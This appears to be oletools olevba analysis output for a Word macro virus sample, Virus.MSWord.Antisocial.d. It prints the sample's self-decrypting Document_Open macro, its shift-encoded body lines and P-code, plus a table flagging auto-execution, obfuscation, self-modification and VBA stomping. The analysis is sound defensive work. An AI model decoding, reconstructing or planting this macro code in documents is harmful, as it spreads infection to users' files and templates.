olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Antisocial.d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Antisocial.d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open(): Application.EnableCancelKey = wdCancelDisabled
For d = 6 To ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines: C$ = ""
I = (ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(d, 1))
f = (Mid(I, 2, 1)): For X = 3 To Len(I): B$ = Asc(Mid(I, X, 1)) - f: C$ = C$ & Chr(B$): Next X: A = C$
ThisDocument.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine d, A: Next d: End Sub
'6Vxo|gzk&Y{h&Jui{sktzeIruyk./@&Uvzouty4Yg|kTuxsgrVxusvz&C&6
'5Tuyntsx3HtsknwrHts{jwxntsx%B%5?%Tuyntsx3[nwzxUwtyjhynts%B%5
'5Xjy%HR%B%YmnxIthzrjsy3[GUwtojhy3[GHtrutsjsyx3Nyjr-6.3HtijRtizqj
'3Vhw#DG#@#DfwlyhGrfxphqw1YESurmhfw1YEFrpsrqhqwv1Lwhp+4,1FrghPrgxoh
'3Vhw#QW#@#QrupdoWhpsodwh1YESurmhfw1YEFrpsrqhqwv1Lwhp+4,1FrghPrgxoh
'7Mvy'k'D'='[v'JT5Jv|u{VmSpulzA'J+'D'))A'P'D'/JT5Spulz/k3'800
'1g!>!Jou)Soe!+!9*!,!2;!Gps!Y!>!2!Up!Mfo)J*;!C%!>!Btd)Nje)J-!Y-!2**!,!g;!D%!>!D%!'!Dis)C%*;!Ofyu!Y;!B!>!D%
'7[opzKvj|tlu{5]IWyvqlj{5]IJvtwvulu{z5P{lt/805JvklTvk|sl5YlwshjlSpul'k3').)'-'m'-'HA'Ul{'k
'7TJ'D'JT5Spulz/83'JT5Jv|u{VmSpulz0
'6GJ4JkrkzkRotky&72&GJ4Iu{tzUlRotky@&GJ4GjjLxusYzxotm&SI
'1OU/EfmfufMjoft!2-!OU/DpvouPgMjoft;!OU/BeeGspnTusjoh!ND
'4EgxmziHsgyqirx2WeziEw$JmpiReqi>AEgxmziHsgyqirx2JyppReqi>$Irh$Wyf
'7.[ol'Kltvyhsp�h{pvu'Vm'[ol'Kltlhu
'7.[l|mspzjo']vu'S€z'Rv}pjR
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Antisocial.d
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 4488 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' 	BoS 0x0000 
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #1:
' 	StartForVariable 
' 	Ld d 
' 	EndForVariable 
' 	LitDI2 0x0006 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	St C$ 
' Line #2:
' 	Ld d 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Paren 
' 	St I 
' Line #3:
' 	Ld I 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Paren 
' 	St False 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	LitDI2 0x0003 
' 	Ld I 
' 	FnLen 
' 	For 
' 	BoS 0x0000 
' 	Ld I 
' 	Ld X 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	Ld False 
' 	Sub 
' 	St B$ 
' 	BoS 0x0000 
' 	Ld C$ 
' 	Ld B$ 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St C$ 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	Ld C$ 
' 	St A 
' Line #4:
' 	Ld d 
' 	Ld A 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld d 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	EndSub 
' Line #5:
' 	QuoteRem 0x0000 0x003B "6Vxo|gzk&Y{h&Jui{sktzeIruyk./@&Uvzouty4Yg|kTuxsgrVxusvz&C&6"
' Line #6:
' 	QuoteRem 0x0000 0x003C "5Tuyntsx3HtsknwrHts{jwxntsx%B%5?%Tuyntsx3[nwzxUwtyjhynts%B%5"
' Line #7:
' 	QuoteRem 0x0000 0x0040 "5Xjy%HR%B%YmnxIthzrjsy3[GUwtojhy3[GHtrutsjsyx3Nyjr-6.3HtijRtizqj"
' Line #8:
' 	QuoteRem 0x0000 0x0042 "3Vhw#DG#@#DfwlyhGrfxphqw1YESurmhfw1YEFrpsrqhqwv1Lwhp+4,1FrghPrgxoh"
' Line #9:
' 	QuoteRem 0x0000 0x0042 "3Vhw#QW#@#QrupdoWhpsodwh1YESurmhfw1YEFrpsrqhqwv1Lwhp+4,1FrghPrgxoh"
' Line #10:
' 	QuoteRem 0x0000 0x003C "7Mvy'k'D'='[v'JT5Jv|u{VmSpulzA'J+'D'))A'P'D'/JT5Spulz/k3'800"
' Line #11:
' 	QuoteRem 0x0000 0x0069 "1g!>!Jou)Soe!+!9*!,!2;!Gps!Y!>!2!Up!Mfo)J*;!C%!>!Btd)Nje)J-!Y-!2**!,!g;!D%!>!D%!'!Dis)C%*;!Ofyu!Y;!B!>!D%"
' Line #12:
' 	QuoteRem 0x0000 0x005A "7[opzKvj|tlu{5]IWyvqlj{5]IJvtwvulu{z5P{lt/805JvklTvk|sl5YlwshjlSpul'k3').)'-'m'-'HA'Ul{'k"
' Line #13:
' 	QuoteRem 0x0000 0x0022 "7TJ'D'JT5Spulz/83'JT5Jv|u{VmSpulz0"
' Line #14:
' 	QuoteRem 0x0000 0x0037 "6GJ4JkrkzkRotky&72&GJ4Iu{tzUlRotky@&GJ4GjjLxusYzxotm&SI"
' Line #15:
' 	QuoteRem 0x0000 0x0037 "1OU/EfmfufMjoft!2-!OU/DpvouPgMjoft;!OU/BeeGspnTusjoh!ND"
' Line #16:
' 	QuoteRem 0x0000 0x0041 "4EgxmziHsgyqirx2WeziEw$JmpiReqi>AEgxmziHsgyqirx2JyppReqi>$Irh$Wyf"
' Line #17:
' 	QuoteRem 0x0000 0x0022 "7.[ol'Kltvyhsp�h{pvu'Vm'[ol'Kltlhu"
' Line #18:
' 	QuoteRem 0x0000 0x001A "7.[l|mspzjo']vu'S€z'Rv}pjR"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

